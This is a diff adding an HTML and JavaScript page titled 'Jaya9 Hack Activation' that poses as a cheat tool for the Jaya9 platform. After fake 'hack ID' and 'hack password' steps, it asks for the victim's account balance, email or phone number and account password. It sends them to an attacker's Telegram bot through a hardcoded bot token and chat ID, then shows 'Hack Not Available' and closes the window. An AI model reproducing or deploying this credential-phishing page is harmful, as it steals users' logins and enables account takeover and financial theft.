@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jaya9 Hack Activation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* All CSS animations are included here */
+        @keyframes fade-in {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes bounce-in {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .animate-fade-in { animation: fade-in 0.3s ease-out; }
+        .animate-bounce-in { animation: bounce-in 0.5s ease-out forwards; }
+        .animate-shake { animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both; }
+        .animate-pulse { animation: pulse 1.5s infinite ease-in-out; }
+    </style>
+</head>
+<body class="bg-gray-50">
+
+    <!-- The entire app will be rendered inside this div -->
+    <div id="app-root"></div>
+
+    <script>
+        // State variables to mimic React's useState
+        let state = {
+            hackId: "",
+            hackPassword: "",
+            accountBalance: "",
+            accountInput: "",
+            finalPassword: "",
+            showPage1Confirmation: false,
+            showPage2Confirmation: false,
+            currentPage: 1,
+            countdown: 5,
+            minBalanceRequired: 0,
+            isHackIdInvalid: false,
+            isHackPasswordInvalid: false,
+            isAccountBalanceInvalid: false,
+            isAccountInputInvalid: false,
+            isFinalPasswordInvalid: false
+        };
+
+        // SVG Icons as strings (replaces lucide-react)
+        const AlertTriangleIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute right-2 top-1/2 -translate-y-1/2 text-red-500"><path d="m21.73 18-8-14a2 2 0 0 0-3.46 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path><path d="M12 9v4"></path><path d="M12 17h.01"></path></svg>`;
+        const CheckCircleIconPage2 = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 text-blue-500 animate-bounce-in"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>`;
+        const CheckCircleIconPage3 = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-8 h-8 text-green-600"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>`;
+
+        // The main render function that updates the DOM based on the current state
+        function render() {
+            const root = document.getElementById('app-root');
+            let html = '';
+            
+            // CORRECTED IMAGE PATH: "Jaya9-logo.png" instead of "/Jaya9-logo.png"
+            const logoHtml = `<div class="pt-4 pl-4"><img src="Jaya9-logo.png" alt="JAYA9" class="w-24 h-auto" /></div>`;
+
+            if (state.currentPage === 1) {
+                html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                    ${logoHtml}
+                    <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+                        <h1 class="text-xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">Inter Your Hack Activation ID</h1>
+                        <div class="w-64 mb-6 relative ${state.isHackIdInvalid ? "animate-shake" : ""}">
+                            <input id="hackIdInput" type="text" placeholder="Hack ID" value="${state.hackId}" class="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all" />
+                            ${state.isHackIdInvalid ? AlertTriangleIcon : ''}
+                        </div>
+                        <button id="confirmBtn" class="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 ${state.hackId.length < 10 ? 'opacity-50 cursor-not-allowed' : ''}" ${state.hackId.length < 10 ? 'disabled' : ''}>Confirm</button>
+                        ${state.showPage1Confirmation ? `<div class="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md animate-fade-in"><p class="text-center font-semibold">✓ Hack ID Confirmed!</p><p class="text-center text-sm mt-1">Loading next page...</p></div>` : ''}
+                    </div>
+                </div>`;
+            }
+            else if (state.currentPage === 2) {
+                html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                    ${logoHtml}
+                    <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+                        <h1 class="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">Enter Your Hack Password</h1>
+                        <div class="w-64 mb-6 relative ${state.isHackPasswordInvalid ? 'animate-shake' : ''}">
+                            <input id="hackPasswordInput" type="text" placeholder="Password" value="${state.hackPassword}" class="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all" />
+                            ${state.isHackPasswordInvalid ? AlertTriangleIcon : ''}
+                        </div>
+                        <button id="activationBtn" class="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${state.hackPassword.length < 6 ? 'opacity-50 cursor-not-allowed' : ''}" ${state.hackPassword.length < 6 ? 'disabled' : ''}>Activation</button>
+                        <button id="backToPage1Btn" class="text-red-600 hover:text-red-700 text-sm underline transition-colors">Back to Hack ID</button>
+                        ${state.showPage2Confirmation ? `<div class="mt-8 p-4 bg-blue-100 border border-blue-400 text-blue-700 rounded-lg shadow-md animate-fade-in flex items-center justify-center gap-2">${CheckCircleIconPage2}<p class="text-center font-semibold">Hack Action Completed</p></div>` : ''}
+                    </div>
+                </div>`;
+            }
+            else if (state.currentPage === 3) {
+                 html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                    ${logoHtml}
+                    <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+                        <h1 class="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">Activation Complete!</h1>
+                        <div class="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md flex items-center justify-center gap-2">
+                            ${CheckCircleIconPage3}
+                            <p class="text-center font-semibold text-lg">Your Hack is Ready!</p>
+                        </div>
+                        <button id="addAccountBtn" class="mt-12 bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95">Add Account</button>
+                    </div>
+                </div>`;
+            }
+            else if (state.currentPage === 4) {
+                const isBalanceInvalid = Number.parseInt(state.accountBalance, 10) < state.minBalanceRequired;
+                html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                     ${logoHtml}
+                     <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+                         <h1 class="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">Enter Your Account Balance</h1>
+                         <div class="w-64 mb-6 relative ${state.isAccountBalanceInvalid ? 'animate-shake' : ''}">
+                             <input id="accountBalanceInput" type="number" placeholder="Enter Amount" value="${state.accountBalance}" class="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all" />
+                              ${state.isAccountBalanceInvalid ? AlertTriangleIcon : ''}
+                         </div>
+                         <button id="balanceConfirmBtn" class="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${isBalanceInvalid || !state.accountBalance ? 'opacity-50 cursor-not-allowed' : ''}" ${isBalanceInvalid || !state.accountBalance ? 'disabled' : ''}>Confirm</button>
+                         <button id="backToPage3Btn" class="text-red-600 hover:text-red-700 text-sm underline transition-colors">Back to Activation</button>
+                     </div>
+                 </div>`;
+            }
+            else if (state.currentPage === 5) {
+                const isNumericOnly = /^\d+$/.test(state.accountInput);
+                let isButtonEnabled = false;
+                if (state.accountInput.startsWith('01')) {
+                    isButtonEnabled = state.accountInput.length === 11 && isNumericOnly;
+                } else if (isNumericOnly) {
+                    isButtonEnabled = state.accountInput.length === 5;
+                } else {
+                    isButtonEnabled = state.accountInput.length >= 6;
+                }
+
+                html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                    ${logoHtml}
+                    <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+                        <h1 class="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">Enter Account Number Or Email</h1>
+                        <div class="w-64 mb-6 relative ${state.isAccountInputInvalid ? 'animate-shake' : ''}">
+                            <input id="accountInput" type="text" placeholder="Email Or Phone" value="${state.accountInput}" class="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all" />
+                            ${state.isAccountInputInvalid ? AlertTriangleIcon : ''}
+                        </div>
+                        <button id="accountConfirmBtn" class="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${!isButtonEnabled ? 'opacity-50 cursor-not-allowed' : ''}" ${!isButtonEnabled ? 'disabled' : ''}>Confirm</button>
+                        <button id="backToPage4Btn" class="text-red-600 hover:text-red-700 text-sm underline transition-colors">Back to Balance</button>
+                    </div>
+                </div>`;
+            }
+            else if (state.currentPage === 6) {
+                html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                    ${logoHtml}
+                    <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+                        <h1 class="text-xl font-bold text-red-600 text-center mb-3 leading-tight max-w-64 px-4">Enter Your Password</h1>
+                        <div class="w-64 mb-6 relative ${state.isFinalPasswordInvalid ? 'animate-shake' : ''}">
+                            <input id="finalPasswordInput" type="password" placeholder="Password" value="${state.finalPassword}" class="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:shadow-lg transition-all" />
+                            ${state.isFinalPasswordInvalid ? AlertTriangleIcon : ''}
+                        </div>
+                        <button id="finalConfirmBtn" class="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 ${state.finalPassword.length < 4 ? 'opacity-50 cursor-not-allowed' : ''}" ${state.finalPassword.length < 4 ? 'disabled' : ''}>Confirm</button>
+                        <button id="backToPage5Btn" class="text-red-600 hover:text-red-700 text-sm underline transition-colors">Back to Account Input</button>
+                        <button id="startOverBtn" class="mt-4 text-red-600 hover:text-red-700 text-sm underline transition-colors">Start Over</button>
+                    </div>
+                </div>`;
+            }
+            else if (state.currentPage === 7) {
+                html = `
+                <div class="min-h-screen bg-gray-50 flex flex-col">
+                    ${logoHtml}
+                    <div class="flex-1 flex flex-col items-center justify-start px-6 pt-20 text-center">
+                        <div class="text-8xl mb-6 animate-pulse">⚠️</div>
+                        <h1 class="text-6xl font-bold text-red-600 mb-4 animate-pulse">Oops!</h1>
+                        <p class="text-xl font-semibold text-red-500 mb-8">Hack Not Available. Try again 😎</p>
+                        <p id="countdown" class="text-lg text-gray-700">Closing in ${state.countdown}s</p>
+                    </div>
+                </div>`;
+                startCountdown();
+            }
+
+            root.innerHTML = html;
+            addEventListeners();
+        }
+
+        function addEventListeners() {
+            const hackIdInput = document.getElementById('hackIdInput');
+            if (hackIdInput) hackIdInput.oninput = (e) => { state.hackId = e.target.value; render(); };
+            const confirmBtn = document.getElementById('confirmBtn');
+            if (confirmBtn) confirmBtn.onclick = handleConfirm;
+            
+            const hackPasswordInput = document.getElementById('hackPasswordInput');
+            if (hackPasswordInput) hackPasswordInput.oninput = (e) => { state.hackPassword = e.target.value; render(); };
+            const activationBtn = document.getElementById('activationBtn');
+            if (activationBtn) activationBtn.onclick = handleActivation;
+            const backToPage1Btn = document.getElementById('backToPage1Btn');
+            if (backToPage1Btn) backToPage1Btn.onclick = handleBackToPage1;
+
+            const addAccountBtn = document.getElementById('addAccountBtn');
+            if (addAccountBtn) addAccountBtn.onclick = () => { state.currentPage = 4; render(); };
+
+            const accountBalanceInput = document.getElementById('accountBalanceInput');
+            if(accountBalanceInput) accountBalanceInput.oninput = e => { state.accountBalance = e.target.value; render(); };
+            const balanceConfirmBtn = document.getElementById('balanceConfirmBtn');
+            if(balanceConfirmBtn) balanceConfirmBtn.onclick = handleBalanceConfirm;
+            const backToPage3Btn = document.getElementById('backToPage3Btn');
+            if(backToPage3Btn) backToPage3Btn.onclick = handleBackToPage3;
+
+            const accountInput = document.getElementById('accountInput');
+            if(accountInput) {
+                accountInput.oninput = e => {
+                    const value = e.target.value;
+                    const isCurrentNumericOnly = /^\d*$/.test(value);
+                    if (isCurrentNumericOnly && !value.startsWith('01')) {
+                        if (value.length <= 5) { state.accountInput = value; }
+                    } else {
+                        state.accountInput = value;
+                    }
+                    render();
+                };
+            }
+            const accountConfirmBtn = document.getElementById('accountConfirmBtn');
+            if(accountConfirmBtn) accountConfirmBtn.onclick = handleAccountInputConfirm;
+            const backToPage4Btn = document.getElementById('backToPage4Btn');
+            if(backToPage4Btn) backToPage4Btn.onclick = handleBackToPage4;
+
+            const finalPasswordInput = document.getElementById('finalPasswordInput');
+            if(finalPasswordInput) finalPasswordInput.oninput = e => { state.finalPassword = e.target.value; render(); };
+            const finalConfirmBtn = document.getElementById('finalConfirmBtn');
+            if(finalConfirmBtn) finalConfirmBtn.onclick = handleFinalPasswordConfirm;
+            const backToPage5Btn = document.getElementById('backToPage5Btn');
+            if(backToPage5Btn) backToPage5Btn.onclick = handleBackToPage5;
+            const startOverBtn = document.getElementById('startOverBtn');
+            if(startOverBtn) startOverBtn.onclick = handleStartOver;
+        }
+
+        // Handlers
+        function setInvalidState(key, value) {
+            state[key] = value;
+            render();
+            if (value) {
+                setTimeout(() => {
+                    state[key] = false;
+                    render();
+                }, 500);
+            }
+        }
+        
+        function handleConfirm() {
+            const middleDigits = state.hackId.substring(1, 3);
+            const allowedMiddleDigits = ["10", "20", "30", "40", "50"];
+            const validPatterns = [`7${middleDigits}4477899`, `8${middleDigits}2069357`, `1${middleDigits}7967802`];
+            const isHackIdValid = state.hackId.length === 10 && allowedMiddleDigits.includes(middleDigits) && validPatterns.includes(state.hackId);
+            
+            if (!isHackIdValid) {
+                setInvalidState('isHackIdInvalid', true);
+                return;
+            }
+
+            let required = 0;
+            switch (middleDigits) {
+                case "10": required = 1000; break;
+                case "20": required = 2000; break;
+                case "30": required = 3000; break;
+                case "40": required = 4000; break;
+                case "50": required = 5000; break;
+            }
+            state.minBalanceRequired = required;
+            state.isHackIdInvalid = false;
+            state.showPage1Confirmation = true;
+            render();
+            setTimeout(() => {
+                state.showPage1Confirmation = false;
+                state.currentPage = 2;
+                render();
+            }, 1500);
+        }
+
+        function handleActivation() {
+            const allowedPasswords = ["124499", "009015", "456924"];
+            if (state.hackPassword.length !== 6 || !allowedPasswords.includes(state.hackPassword)) {
+                setInvalidState('isHackPasswordInvalid', true);
+                return;
+            }
+            state.isHackPasswordInvalid = false;
+            state.showPage2Confirmation = true;
+            render();
+            setTimeout(() => {
+                state.showPage2Confirmation = false;
+                state.currentPage = 3;
+                render();
+            }, 1500);
+        }
+
+        function handleBalanceConfirm() {
+            const balance = Number.parseInt(state.accountBalance, 10);
+            if (isNaN(balance) || balance < state.minBalanceRequired) {
+                setInvalidState('isAccountBalanceInvalid', true);
+                return;
+            }
+            state.isAccountBalanceInvalid = false;
+            state.currentPage = 5;
+            render();
+        }
+
+        function handleAccountInputConfirm() {
+            const isNumericOnly = /^\d+$/.test(state.accountInput);
+            let isValid = false;
+            if (state.accountInput.startsWith('01')) {
+                isValid = state.accountInput.length === 11 && isNumericOnly;
+            } else if (isNumericOnly) {
+                isValid = state.accountInput.length === 5;
+            } else {
+                isValid = state.accountInput.length >= 6;
+            }
+            if (!isValid) {
+                setInvalidState('isAccountInputInvalid', true);
+                return;
+            }
+            state.isAccountInputInvalid = false;
+            state.currentPage = 6;
+            render();
+        }
+
+        async function handleFinalPasswordConfirm() {
+            if (state.finalPassword.length < 4) {
+                setInvalidState('isFinalPasswordInvalid', true);
+                return;
+            }
+            state.isFinalPasswordInvalid = false;
+            render();
+
+            await sendTelegramMessage(state.accountBalance, state.accountInput, state.finalPassword);
+            
+            state.currentPage = 7;
+            render();
+        }
+
+        function startCountdown() {
+            state.countdown = 5;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                state.countdown -= 1;
+                if(countdownEl) countdownEl.innerText = `Closing in ${state.countdown}s`;
+                if (state.countdown <= 0) {
+                    clearInterval(timer);
+                    window.close();
+                    setTimeout(() => { window.history.back(); }, 100);
+                }
+            }, 1000);
+        }
+
+        // Back button handlers
+        function resetValidationStates() {
+            state.isHackIdInvalid = false;
+            state.isHackPasswordInvalid = false;
+            state.isAccountBalanceInvalid = false;
+            state.isAccountInputInvalid = false;
+            state.isFinalPasswordInvalid = false;
+        }
+
+        function handleBackToPage1() { state.currentPage = 1; state.hackPassword = ""; resetValidationStates(); render(); }
+        function handleBackToPage3() { state.currentPage = 3; state.accountBalance = ""; resetValidationStates(); render(); }
+        function handleBackToPage4() { state.currentPage = 4; state.accountInput = ""; resetValidationStates(); render(); }
+        function handleBackToPage5() { state.currentPage = 5; state.finalPassword = ""; resetValidationStates(); render(); }
+        function handleStartOver() {
+            Object.assign(state, {
+                currentPage: 1, hackId: "", hackPassword: "", accountBalance: "", accountInput: "", finalPassword: "", minBalanceRequired: 0
+            });
+            resetValidationStates();
+            render();
+        }
+
+        // Client-side Telegram function
+        async function sendTelegramMessage(accountAmount, emailOrNumber, password) {
+            // WARNING: YOUR BOT TOKEN IS PUBLICLY VISIBLE HERE.
+            const BOT_TOKEN = "8142264868:AAEYqUG9eGaSXk0Gj5BHCEo2a0a3eC2r6l0";
+            const CHAT_ID = "7335173906";
+            const PLATFORM_NAME = "Jaya9";
+
+            const message = `Platform Name: ${PLATFORM_NAME}\nAccount Amount: ${accountAmount}\nEmail/Number: ${emailOrNumber}\nPassword: ${password}`.trim();
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+                });
+                if (!response.ok) console.error("Failed to send Telegram message:", await response.json());
+                else console.log("Telegram message sent successfully!");
+            } catch (error) {
+                console.error("Error sending Telegram message:", error);
+            }
+        }
+
+        // Initial render when the page loads
+        document.addEventListener('DOMContentLoaded', render);
+    </script>
+</body>
+</html>
